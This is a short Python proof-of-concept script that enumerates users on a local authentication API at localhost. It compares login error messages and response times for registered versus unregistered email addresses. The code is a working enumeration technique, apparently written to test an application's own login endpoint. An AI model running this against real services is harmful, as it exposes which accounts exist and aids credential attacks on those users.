#!/usr/bin/env python3
import requests
import time

BASE_URL = "http://localhost:8080/api"

def user_enumeration_attack():
    print("[*] Initializing user enumeration module")
    
    known_user = "admin_target@test.com"
    requests.post(
        f"{BASE_URL}/auth/register",
        json={"email": known_user, "password": "temp_password_123"}
    )
    
    test_cases = [
        {"email": known_user, "password": "wrong_password", "type": "Valid User"},
        {"email": "null_user@test.com", "password": "wrong_password", "type": "Invalid User"}
    ]
    
    print("[*] Testing authentication response vectors")
    for test in test_cases:
        start_time = time.time()
        response = requests.post(
            f"{BASE_URL}/auth/login",
            json={"email": test['email'], "password": test['password']}
        )
        elapsed = time.time() - start_time
        
        msg = response.json().get('message', 'No message')
        print(f"[*] Vector: {test['type']:<15} | Status: {response.status_code} | Time: {elapsed:.3f}s | Response: {msg}")

    print("[*] Executing timing analysis")
    emails_to_test = [
        known_user,
        "ghost_account_1@test.com",
        "ghost_account_2@test.com"
    ]
    
    for email in emails_to_test:
        times = []
        for _ in range(3):
            start = time.time()
            requests.post(
                f"{BASE_URL}/auth/login",
                json={"email": email, "password": "dummy_password"}
            )
            times.append(time.time() - start)
        
        avg_time = sum(times) / len(times)
        print(f"[*] Target: {email:<25} | Avg Response Time: {avg_time:.4f}s")

if __name__ == "__main__":
    user_enumeration_attack()